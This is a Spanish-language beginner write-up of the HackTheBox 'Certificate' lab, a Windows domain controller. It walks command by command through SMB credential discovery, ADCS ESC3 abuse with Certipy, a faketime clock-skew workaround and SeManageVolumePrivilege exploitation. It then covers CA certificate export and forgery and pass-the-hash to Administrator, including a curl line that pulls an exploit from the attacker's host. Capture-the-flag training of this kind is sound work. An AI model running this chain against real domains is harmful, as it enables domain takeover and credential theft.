 
# Certificate HTB - Write-up Completo para Principiantes

## Información de la Máquina
- **IP**: 10.10.11.71
- **Nombre**: Certificate
- **Sistema Operativo**: Windows Server (Domain Controller)
- **Dificultad**: Media
- **Objetivos**: Obtener flag de usuario y flag de root

## Índice
1. [Preparación del Entorno](#1-preparación-del-entorno)
2. [Reconocimiento Inicial](#2-reconocimiento-inicial)
3. [Enumeración de Servicios](#3-enumeración-de-servicios)
4. [Explotación Inicial - Obtener Primera Shell](#4-explotación-inicial)
5. [Escalación de Privilegios - Parte 1](#5-escalación-de-privilegios-parte-1)
6. [Escalación de Privilegios - Parte 2](#6-escalación-de-privilegios-parte-2)
7. [Lecciones Aprendidas](#7-lecciones-aprendidas)

---

## 1. Preparación del Entorno

### 1.1 Herramientas Necesarias

Antes de empezar, necesitamos instalar varias herramientas:

```bash
# Actualizar sistema
sudo apt update && sudo apt upgrade -y

# Herramientas básicas de pentesting
sudo apt install -y nmap smbmap smbclient enum4linux crackmapexec evil-winrm

# Python y pip
sudo apt install -y python3 python3-pip

# Herramientas adicionales
sudo apt install -y faketime chrony rdate

# Certipy - Herramienta para explotar Active Directory Certificate Services
git clone https://github.com/ly4k/Certipy.git
cd Certipy
# Verificar que funciona
python3 certipy/entry.py --version
```

### 1.2 Agregar máquina al archivo hosts

```bash
# Editar archivo hosts
sudo nano /etc/hosts

# Agregar estas líneas:
10.10.11.71 certificate.htb
10.10.11.71 dc01.certificate.htb
```

---

## 2. Reconocimiento Inicial

### 2.1 Escaneo de Puertos

Primero necesitamos saber qué servicios están corriendo:

```bash
# Escaneo básico
nmap -sV 10.10.11.71

# Escaneo más detallado con scripts
nmap -sCV 10.10.11.71 -p-
```

**Puertos encontrados y su significado:**
- **53/tcp (DNS)**: Servicio de nombres de dominio
- **88/tcp (Kerberos)**: Autenticación en Active Directory
- **135/tcp (MSRPC)**: Remote Procedure Call de Microsoft
- **139/tcp (NetBIOS)**: Compartición de archivos antigua
- **445/tcp (SMB)**: Compartición de archivos moderna
- **636/tcp (LDAPS)**: LDAP seguro
- **3268/tcp (LDAP)**: Global Catalog
- **5985/tcp (WinRM)**: Windows Remote Management

**Aprendizaje**: La presencia de Kerberos (88) y LDAP (636/3268) nos indica que es un Domain Controller de Active Directory.

---

## 3. Enumeración de Servicios

### 3.1 Enumeración SMB - Búsqueda de Archivos Compartidos

SMB es donde Windows comparte archivos. Vamos a ver qué podemos encontrar:

```bash
# Intentar listar compartidos sin credenciales
smbmap -H 10.10.11.71

# Si no funciona, intentar con usuario guest
smbmap -H 10.10.11.71 -u guest

# Intentar con crackmapexec
crackmapexec smb 10.10.11.71 -u '' -p '' --shares
```

**Resultado encontrado:**
```
Development     READ            Development Department Share
```

### 3.2 Explorar el Share "Development"

```bash
# Conectarse al share
smbclient //10.10.11.71/Development

# Dentro del cliente SMB:
smb: \> dir
smb: \> get LICENSE
smb: \> exit

# Leer el archivo descargado
cat LICENSE
```

**Hallazgo importante**: En el archivo LICENSE encontramos:
```
[...] the responsible administrator is Lion.Sk

Qualys scan results
-------------------
[...] Lion.Sk, password: !QAZ2wsx
```

### 3.3 Problema con el Usuario - Mayúsculas y Minúsculas

Aquí encontramos nuestro primer problema. El usuario aparece como "Lion.Sk" pero Windows es sensible a mayúsculas en los usernames.

```bash
# Intentar con diferentes combinaciones
crackmapexec smb 10.10.11.71 -u 'Lion.Sk' -p '!QAZ2wsx'  # Falla
crackmapexec smb 10.10.11.71 -u 'lion.sk' -p '!QAZ2wsx'  # Falla
crackmapexec smb 10.10.11.71 -u 'LION.SK' -p '!QAZ2wsx'  # Falla
crackmapexec smb 10.10.11.71 -u 'Lion.SK' -p '!QAZ2wsx'  # ¡FUNCIONA!
```

**Lección aprendida**: Windows convierte los usernames a mayúsculas internamente. "Lion.SK" es el formato correcto.

---

## 4. Explotación Inicial - Obtener Primera Shell

### 4.1 Verificar Acceso con Evil-WinRM

```bash
# Intentar conectarse por WinRM
evil-winrm -i 10.10.11.71 -u Lion.SK -p '!QAZ2wsx'
```

¡Funciona! Ya tenemos acceso como Lion.SK.

### 4.2 Obtener Primera Flag

```powershell
# Ver en qué directorio estamos
pwd

# Ir al escritorio
cd C:\Users\Lion.SK\Desktop

# Listar archivos
dir

# Leer la flag
type user.txt
```

**Flag de usuario**: `****************************`

---

## 5. Escalación de Privilegios - Parte 1: De Lion.SK a ryan.k

### 5.1 Enumeración de Active Directory Certificate Services (ADCS)

ADCS es un servicio de Windows que maneja certificados digitales. Si está mal configurado, puede permitir escalación de privilegios.

#### 5.1.1 Instalar y usar Certipy

```bash
# En nuestra máquina Kali
cd ~/Certipy

# Buscar vulnerabilidades en certificados
python3 certipy/entry.py find -u 'Lion.SK@CERTIFICATE.HTB' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -stdout
```

**Resultado importante**: Encontramos una vulnerabilidad ESC3 en el template "Delegated-CRA"

#### 5.1.2 ¿Qué es ESC3?

ESC3 es cuando:
1. Podemos pedir un certificado de "agente" (Certificate Request Agent)
2. Con ese certificado de agente, podemos pedir certificados en nombre de otros usuarios

### 5.2 Explotar ESC3

#### Paso 1: Obtener certificado de agente

```bash
python3 certipy/entry.py req -u 'Lion.SK@CERTIFICATE.HTB' -p '!QAZ2wsx' \
    -dc-ip 10.10.11.71 -target DC01.CERTIFICATE.HTB \
    -ca 'Certificate-LTD-CA' -template 'Delegated-CRA' -out lion.sk
```

**Archivos creados**:
- `lion.sk.pfx`: Certificado con clave privada
- `lion.sk.key`: Clave privada
- `lion.sk.crt`: Certificado público

#### Paso 2: Usar el certificado de agente para pedir uno de ryan.k

```bash
python3 certipy/entry.py req -u 'Lion.SK@CERTIFICATE.HTB' -p '!QAZ2wsx' \
    -dc-ip 10.10.11.71 -target DC01.CERTIFICATE.HTB \
    -ca 'Certificate-LTD-CA' -template 'SignedUser' \
    -on-behalf-of 'CERTIFICATE\ryan.k' -pfx lion.sk.pfx -out ryan.k
```

### 5.3 Problema de Sincronización de Tiempo

Al intentar autenticarnos con el certificado:

```bash
python3 certipy/entry.py auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'
```

**Error**: `KRB_AP_ERR_SKEW(Clock skew too great)`

#### 5.3.1 ¿Por qué ocurre este error?

Kerberos (el sistema de autenticación de Windows) requiere que la diferencia de tiempo entre cliente y servidor sea menor a 5 minutos.

#### 5.3.2 Soluciones probadas

**Intento 1 - Sincronizar manualmente**:
```bash
# Ver hora del servidor
nmap -p 445 --script smb2-time 10.10.11.71 | grep date
# Resultado: date: 2025-09-18T03:37:44

# Ajustar nuestra hora
sudo date -s "18 SEP 2025 03:38:00"
```

**Intento 2 - Usar faketime** (FUNCIONÓ):
```bash
# faketime engaña al programa haciéndole creer que está en otra hora
faketime '2025-09-18 03:50:00' python3 certipy/entry.py auth \
    -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'
```

**Resultado exitoso**:
```
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
```

### 5.4 Conectarse como ryan.k

```bash
# Usar solo la parte después de los dos puntos
evil-winrm -i 10.10.11.71 -u ryan.k -H b1bc3d70e70f4f36b1509a65ae1a2ae6
```

---

## 6. Escalación de Privilegios - Parte 2: De ryan.k a Administrator

### 6.1 Enumerar Privilegios

```powershell
# Ver qué privilegios especiales tenemos
whoami /priv
```

**Privilegio importante encontrado**: `SeManageVolumePrivilege`

#### ¿Qué es SeManageVolumePrivilege?

Este privilegio permite realizar tareas de mantenimiento en volúmenes. Un atacante puede abusar de él para cambiar permisos en cualquier archivo del sistema.

### 6.2 Explotar SeManageVolumePrivilege

#### Paso 1: Descargar el exploit

**En Kali**:
```bash
# Descargar el exploit
wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe

# Servir archivos por HTTP
python3 -m http.server 8000
```

**En la máquina víctima (como ryan.k)**:
```powershell
# IMPORTANTE: Usar tu IP correcta (verificar con: ip a | grep tun0)
curl http://10.10.14.59:8000/SeManageVolumeExploit.exe -o SeManageVolumeExploit.exe

# Verificar que se descargó
dir SeManageVolumeExploit.exe
```

#### Paso 2: Ejecutar el exploit

```powershell
.\SeManageVolumeExploit.exe
```

**Resultado**: `Entries changed: 876`

Esto significa que ahora tenemos permisos para leer/escribir en todo C:\

### 6.3 Obtener el Certificado CA

Con los nuevos permisos, podemos exportar el certificado de la Autoridad Certificadora (CA):

```powershell
# Crear directorio temporal
mkdir C:\temp

# Buscar certificados
Get-ChildItem -Path Cert:\LocalMachine\My

# Buscar específicamente el CA
Get-ChildItem -Path Cert:\LocalMachine\My | Where-Object {$_.Subject -like "*Certificate-LTD-CA*"}

# Exportar el certificado con su clave privada
$cert = Get-ChildItem -Path Cert:\LocalMachine\My | Where-Object {$_.Subject -like "*Certificate-LTD-CA*"}
Export-PfxCertificate -Cert $cert -FilePath C:\temp\ca.pfx -Password (ConvertTo-SecureString -String "password" -Force -AsPlainText)

# Copiar al directorio actual y descargar
copy C:\temp\ca.pfx .
download ca.pfx
```

### 6.4 Forjar Certificado de Administrator

Con el certificado CA, podemos crear certificados válidos para cualquier usuario:

```bash
# En Kali
cd ~/Certificate/Certipy

# Forjar certificado de Administrator
python3 certipy/entry.py forge -ca-pfx ca.pfx -ca-password 'password' \
    -upn 'administrator@certificate.htb' \
    -subject 'CN=Administrator,CN=Users,DC=certificate,DC=htb' \
    -out admin.pfx

# Autenticarse (con faketime nuevamente)
faketime '2025-09-18 04:10:00' python3 certipy/entry.py auth \
    -dc-ip '10.10.11.71' -pfx 'admin.pfx'
```

**Hash de Administrator obtenido**: `d804304519bf0143c14cbf1c024408c6`

### 6.5 Acceso como Administrator

```bash
evil-winrm -i 10.10.11.71 -u administrator -H d804304519bf0143c14cbf1c024408c6
```

### 6.6 Obtener Flag Root

```powershell
# Verificar que somos Administrator
whoami

# Obtener la flag
type C:\Users\Administrator\Desktop\root.txt
```

**Flag root**: `****************************`

---

## 7. Lecciones Aprendidas

### 7.1 Sobre Active Directory Certificate Services (ADCS)

1. **¿Qué es ADCS?**
   - Sistema de Microsoft para crear y gestionar certificados digitales
   - Usado para autenticación, cifrado y firma digital

2. **Vulnerabilidad ESC3**:
   - Ocurre cuando un usuario puede obtener un certificado de "agente"
   - Con ese certificado puede solicitar certificados para otros usuarios
   - Es crítica porque permite escalar privilegios horizontalmente

3. **Herramienta Certipy**:
   - Automatiza la búsqueda y explotación de vulnerabilidades ADCS
   - Comandos principales:
     - `find`: Buscar vulnerabilidades
     - `req`: Solicitar certificados
     - `auth`: Autenticarse con certificados
     - `forge`: Crear certificados falsos

### 7.2 Sobre Sincronización de Tiempo

1. **Kerberos y el tiempo**:
   - Kerberos rechaza autenticaciones si la diferencia es > 5 minutos
   - Es una medida de seguridad contra ataques de replay

2. **Herramientas útiles**:
   - `faketime`: Ejecuta programas con una hora falsa
   - `ntpdate/rdate`: Sincroniza con servidores de tiempo
   - `date -s`: Ajusta manualmente la hora del sistema

### 7.3 Sobre SeManageVolumePrivilege

1. **¿Qué permite?**:
   - Realizar operaciones de mantenimiento en volúmenes
   - Puede ser abusado para cambiar permisos en cualquier archivo

2. **Por qué es peligroso**:
   - Permite acceder a archivos protegidos del sistema
   - En este caso, nos permitió exportar el certificado CA

### 7.4 Sobre Certificate Forgery

1. **Con acceso al certificado CA**:
   - Podemos crear certificados válidos para cualquier usuario
   - Windows confiará en estos certificados
   - Permite autenticación completa sin conocer contraseñas

### 7.5 Errores Comunes y Soluciones

1. **Problema de mayúsculas en usuarios**:
   - Windows convierte usernames a mayúsculas
   - Probar diferentes combinaciones

2. **Errores de sincronización de tiempo**:
   - Usar `faketime` es más confiable que cambiar hora del sistema
   - Siempre verificar la hora del DC antes de autenticarse

3. **Problemas de descarga en Evil-WinRM**:
   - El comando `download` es sensible a rutas
   - Copiar archivos al directorio actual antes de descargar

4. **IPs incorrectas**:
   - Siempre verificar tu IP con `ip a | grep tun0`
   - Los corchetes en IPs causan errores en PowerShell

### 7.6 Comandos de Verificación Útiles

```powershell
# En Windows
whoami              # Usuario actual
whoami /priv        # Privilegios
hostname            # Nombre del servidor
ipconfig /all       # Configuración de red
net user            # Lista de usuarios

# En Kali
ip a | grep tun0    # Tu IP en la VPN
date                # Hora actual del sistema
```

### 7.7 Flujo de Ataque Resumido

1. **Reconocimiento** → SMB shares abiertos
2. **Credenciales iniciales** → En archivo LICENSE
3. **Acceso inicial** → WinRM con Lion.SK
4. **Escalación horizontal** → ESC3 para obtener ryan.k
5. **Escalación vertical** → SeManageVolumePrivilege + Certificate Forgery
6. **Acceso total** → Administrator

---

## Recursos Adicionales

- **Certipy**: https://github.com/ly4k/Certipy
- **ADCS Attacks**: https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf
- **SeManageVolumeExploit**: https://github.com/CsEnox/SeManageVolumeExploit
- **Evil-WinRM**: https://github.com/Hackplayers/evil-winrm

---

**Nota**: Este write-up está diseñado para fines educativos. Úsalo solo en entornos autorizados como HackTheBox.
